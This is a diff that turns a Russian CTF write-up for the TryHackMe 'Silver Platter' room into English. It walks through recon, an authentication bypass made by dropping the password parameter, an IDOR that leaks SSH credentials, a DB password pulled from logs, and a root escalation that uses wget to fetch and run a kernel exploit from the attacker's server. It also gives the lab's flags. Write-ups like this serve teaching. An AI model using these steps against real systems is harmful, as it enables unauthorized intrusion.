@@ -1,15 +1,16 @@
-**IP**: меняется.
-**Общее времяпровождение в комнате:** около 200 минут.
+# Silver Platter — TryHackMe
 
-## 1. Разведка
+## 1. Reconnaissance
 
 ### Nmap
 
-```bash
-sudo nmap -sV -sS 10.114.146.144
-```
+We start with a standard service scan.
+
+Bash
 
 ```
+sudo nmap -sV -sS 10.114.146.144
+
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 09:06 EDT
 Nmap scan report for 10.114.146.144
 Host is up (0.19s latency).
@@ -20,71 +21,76 @@ PORT     STATE SERVICE    VERSION
 8080/tcp open  http-proxy
 ```
 
-Открыты три порта. Основной интерес — 8080(это было понято не сразу ).
+Three ports are open. The main point of interest is port 8080, although I didn't realize that immediately.
 
 ### Nuclei
 
-```bash
-nuclei -u 10.114.146.144 -severity low,medium,high,critical -o nuclei_results.txt
-```
+Next, we run Nuclei to search for known vulnerabilities.
+
+Bash
 
 ```
+nuclei -u 10.114.146.144 -severity low,medium,high,critical -o nuclei_results.txt
+
 [CVE-2023-48795] [javascript] [medium] 10.114.146.144:22 ["Vulnerable to Terrapin"]
 [INF] Scan completed in 1m. 1 matches found.
 ```
 
-Найдена только Terrapin (CVE-2023-48795) на SSH. Для дальнейшего продвижения это неинтересно.
+The only vulnerability detected is Terrapin (CVE-2023-48795) on SSH. It is not particularly useful for our further progress.
 
----
+## 2. SSH Brute Force (Unsuccessful)
 
-## 2. Перебор SSH (неудачный)
+I attempted to brute-force SSH using Metasploit.
 
-Попытка брутфорса через Metasploit:
+Bash
 
-```bash
-# модуль auxiliary/scanner/ssh/ssh_login
-# username: scr1ptkiddy h4x0r (статичный)
-# passwords: /home/deb88/HH101/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+```
+# Module: auxiliary/scanner/ssh/ssh_login
+# Username: scr1ptkiddy h4x0r (static)
+# Passwords: /home/deb88/HH101/seclists/Passwords/Leaked-Databases/rockyou-75.txt
 ```
 
-**Ссылка на методику:**  
-https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d
+Methodology: [https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d](https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d) 
 
-Брут не дал результата. Вспомнил о порте 8080.
+The brute-force attempt was unsuccessful. I then remembered the open port 8080.
 
----
+## 3. Discovery
 
-## 3. Обнаружение
+### Gobuster on Port 8080
 
-### Gobuster на порту 8080
+We run Gobuster against port 8080 to discover hidden directories.
 
-```bash
+Bash
+
+```
 gobuster dir -u 10.112.155.196:8080 -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt
-```
 
-```
 /console              (Status: 302) [Size: 0] [--> /noredirect.html]
 /website              (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/website/]
 Progress: 19008 / 19008 (100.00%)
 ```
 
-В разделе `#contact` выясняется, что **Silverpeas** — это название ПО, а не комнаты.
+In the `#contact` section, I discover that Silverpeas is the name of the software, not the room itself.
 
-### Поиск эксплойта
+### Searching for an Exploit
 
-Случайно найдено(по запросу Silverpeas CVE):
+I accidentally came across the following exploit while searching for Silverpeas CVEs:
 
-https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320
+[https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320) 
 
-Я понял, что на 8080 есть что-то намного интереснее, чем ничего.
+At this point, I realized that port 8080 had something much more interesting running on it.
 
-### Gobuster по /silverpeas
+### Gobuster on `/silverpeas`
 
-```bash
+We run Gobuster against the Silverpeas directory.
+
+Bash
+
+```
 gobuster dir -u http://10.112.155.196:8080/silverpeas -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt
 ```
 
-Ключевые находки:
+Key findings:
 
 ```
 /Login                (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/defaultLogin.jsp]
@@ -94,44 +100,47 @@ gobuster dir -u http://10.112.155.196:8080/silverpeas -w /home/deb88/HH101/secli
 /proxy                (Status: 200) [Size: 548]
 /j_security_check     (Status: 500) [Size: 842]
 /sso                  (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/Login?ErrorCode=2&DomainId=-1]
-... (много других путей)
+... (many other paths)
 Progress: 81924 / 81928 (100.00%)
 ```
 
-Страница логина: `/silverpeas/defaultLogin.jsp`
-Но тут как оказалось интерес в другом.
+The login page is located at:
 
----
+```
+/silverpeas/defaultLogin.jsp
+```
 
-## 4. Обход аутентификации (Authentication Bypass)
+However, as it turns out, the interesting part lies elsewhere.
 
-Через Caido перехватываем запрос на логин.
+## 4. Authentication Bypass
 
-Исходный запрос содержит логин и пароль. Удаляем переменную пароля полностью:
+We intercept the login request using Caido.
+
+The original request contains both a username and a password. We completely remove the password parameter, leaving only:
 
 ```
 Login=scr1ptkiddy&DomainId=0
 ```
 
-После отправки такого запроса получаем доступ:
+After sending this modified request, we gain access to the application:
 
 ```
 http://10.112.171.255:8080/silverpeas/look/jsp/MainFrame.jsp#
 ```
 
-Успешный вход без пароля под пользователем `scr1ptkiddy`.
+We have successfully logged in as `scr1ptkiddy` without providing a password.
 
----
+## 5. IDOR — Reading Another User's Messages
 
-## 5. IDOR — чтение чужих сообщений
+Inside the messaging module (Silvermail), we modify the message ID in the request to `6`.
 
-В модуле сообщений (Silvermail) меняем ID в запросе на 6: 
+http
 
-```http
+```
 GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6 HTTP/1.1
 ```
 
-Содержимое сообщения:
+The message contains the following information:
 
 ```
 Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
@@ -140,66 +149,95 @@ Username: tim
 Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 ```
 
-Получаем SSH-учётные данные пользователя `tim` и входим.
-
----
+We have obtained the SSH credentials for the user `tim`.
 
 ## 6. User Flag
 
-```bash
-ssh tim@10.xxx.xxx.xxx
-# пароль: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+We use the credentials to connect to the machine via SSH.
 
+Bash
+
+```
+ssh tim@10.xxx.xxx.xxx
+# Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+```
+
+After logging in, we retrieve the user flag.
+
+Bash
+
+```
 cat user.txt
 THM{c4ca4238a0b923820dcc509a6f75849b}
 ```
 
-```bash
+Next, we check our current privileges.
+
+Bash
+
+```
 id
 uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ```
 
-Пользователь `tim` входит в группу `adm`.
+The `tim` user is a member of the `adm` group, which grants access to certain system logs.
 
----
+## 7. Privilege and Log Analysis
 
-## 7. Анализ привилегий и логов
+First, we check the account of another user, `tyler`.
 
-```bash
+Bash
+
+```
 grep tyler /etc/passwd
 tyler:x:1000:1000:root:/home/tyler:/bin/bash
 ```
 
-```bash
-# группы
+We also inspect the groups:
+
+Bash
+
+```
+# Groups
 adm:x:4:syslog,tyler,tim,ubuntu
 sudo:x:27:tyler,ubuntu
 docker:x:119:
 ```
 
-`tyler` имеет sudo и состоит в docker. Нужен доступ к его учётке(по задумке возможно, но я прошел по-другому).
+The `tyler` user has sudo privileges and belongs to the `docker` group. We need access to this account. This was probably the intended path, but I managed to complete the room another way.
 
-### Логи Docker
+### Docker Logs
 
-В `/var/log` (доступна группе `adm`) найдены записи:
+Since the `adm` group can access system logs, we inspect `/var/log`.
+
+We find the following entries:
 
 ```
 /var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
 /var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
 ```
 
-Извлечённые данные:
-- `DB_NAME=Silverpeas`
-- `DB_USER=silverpeas`
-- `DB_PASSWORD=_Zd_zx7N823/`
+We extract the following credentials:
 
-Silverpeas работает внутри Docker-контейнера.
+* `DB_NAME=Silverpeas`
 
-### SUID-бинарники
+* `DB_USER=silverpeas`
 
-```bash
+* `DB_PASSWORD=_Zd_zx7N823/`
+
+This confirms that Silverpeas is running inside a Docker container.
+
+### SUID Binaries
+
+We also search for SUID binaries.
+
+Bash
+
+```
 find / -perm -4000 -type f 2>/dev/null
 ```
+
+The results include:
 
 ```
 /snap/core20/2264/usr/bin/chfn
@@ -211,13 +249,11 @@ find / -perm -4000 -type f 2>/dev/null
 ...
 ```
 
-Классические SUID, ничего экзотического.
-
----
+These are standard SUID binaries. Nothing unusual stands out.
 
 ## 8. Privilege Escalation — Copy Fail (CVE-2026-31431)
 
-LinPEAS обнаружил уязвимость:
+During the system enumeration, LinPEAS detects a vulnerability known as Copy Fail.
 
 ```
 ╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
@@ -226,74 +262,127 @@ LinPEAS обнаружил уязвимость:
 VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered
 ```
 
-Эксплойт:  
-https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py
+The exploit is available here:
 
-### Использование
+[https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) 
 
-На атакующей машине:
+### Exploitation
 
-```bash
+On the attacking machine, we start a temporary HTTP server.
+
+Bash
+
+```
 sudo python3 -m http.server 80
 ```
 
-На цели:
+On the target machine, we download and execute the exploit.
 
-```bash
+Bash
+
+```
 tim@ip-10-113-135-146:/tmp$ wget http://192.168.154.82/copy_fail_exp.py
 python3 copy_fail_exp.py
 ```
 
-Результат:
+After successful execution, we check our privileges.
 
-```bash
+Bash
+
+```
 # id
 uid=0(root) gid=1001(tim) groups=1001(tim),4(adm)
 ```
 
-Переходим в `/root` и читаем флаг:
+We now have root privileges.
 
-```bash
+Next, we navigate to `/root` and retrieve the root flag.
+
+Bash
+
+```
 cat /root/root.txt
 THM{098f6bcd4621d373cade4e832627b4f6}
 ```
 
----
+## 9. How the Copy Fail Exploit Works
 
-## 9. Как работает эксплойт Copy Fail
+CVE-2026-31431 is a vulnerability in the Linux kernel involving the `AF_ALG` interface and `splice`.
 
-**CVE-2026-31431** — уязвимость в механизме `AF_ALG` + `splice` ядра Linux.  
-Она позволяет создать неразрушающую запись в page-cache.  
-Эксплойт использует эту возможность для перезаписи привилегированных структур/страниц памяти и получения root-прав (T1068).
+It allows an attacker to perform a non-destructive write to the page cache.
 
-Подробности и код:  
-https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py  
-https://copy.fail/
+The exploit takes advantage of this behavior to overwrite privileged structures or memory pages and obtain root privileges. This is classified as T1068 — Exploitation for Privilege Escalation.
 
----
+More details and the exploit code:
 
-## 10. Полезные ресурсы 
+* [https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) 
 
-- https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d
-- https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320
-- https://hacktricks-training.com/courses/lhe/
-- https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
-- https://copy.fail/
-- https://www.cve.org/CVERecord?id=CVE-2026-31431
-- https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py
+* [https://copy.fail/](https://copy.fail/) 
 
----
+## 10. Useful Resources
 
-## Итоговые флаги
+* [SSH Brute Force and Privilege Escalation](https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d) 
 
-| Флаг     | Значение                                      |
-|----------|-----------------------------------------------|
-| user.txt | `THM{c4ca4238a0b923820dcc509a6f75849b}`       |
-| root.txt | `THM{098f6bcd4621d373cade4e832627b4f6}`       |
+* [CVE-2023-47320 — Rhino Security Labs](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320) 
 
-**Цепочка:**  
-Nmap → Nuclei → Gobuster → Auth Bypass (удаление пароля) → IDOR в сообщениях → SSH как `tim` → чтение логов (adm) → LinPEAS → Copy Fail exploit → root.
+* [HackTricks — Linux Privilege Escalation](https://hacktricks-training.com/courses/lhe/) 
 
-Прочитав другие writeupы, узнал, что все было куда логичнее. У юзера Тайлера был пароль такой же как и у БД постгрес: `POSTGRES_PASSWORD=_Zd_zx7N823/`.
-После этого мы могли войти `su tyler` в его учетку и зайти в директорию `/root`.
+* [HackTricks — Linux Privilege Escalation Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) 
 
+* [Copy Fail](https://copy.fail/) 
+
+* [CVE-2026-31431 — CVE Record](https://www.cve.org/CVERecord?id=CVE-2026-31431) 
+
+* [Copy Fail Exploit — GitHub](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) 
+
+## Final Flags
+
+|
+Flag
+
+|
+
+Value
+
+|
+| --- | --- |
+|
+
+`user.txt`
+
+|
+
+`THM{c4ca4238a0b923820dcc509a6f75849b}`
+
+|
+|
+
+`root.txt`
+
+|
+
+`THM{098f6bcd4621d373cade4e832627b4f6}`
+
+|
+
+## Exploitation Chain
+
+Nmap → Nuclei → Gobuster → Authentication Bypass (removing the password parameter) → IDOR in Silvermail → SSH as `tim` → Log Analysis (`adm`) → LinPEAS → Copy Fail Exploit → Root.
+
+After reading other writeups, I discovered that the intended path was much more straightforward.
+
+The `tyler` user's password was the same as the PostgreSQL database password:
+
+```
+POSTGRES_PASSWORD=_Zd_zx7N823/
+```
+
+With this password, we could switch to the `tyler` account using:
+
+Bash
+
+```
+su tyler
+```
+
+After gaining access to `tyler`, we could use the privileges associated with that account to access the `/root` directory and retrieve the root flag.
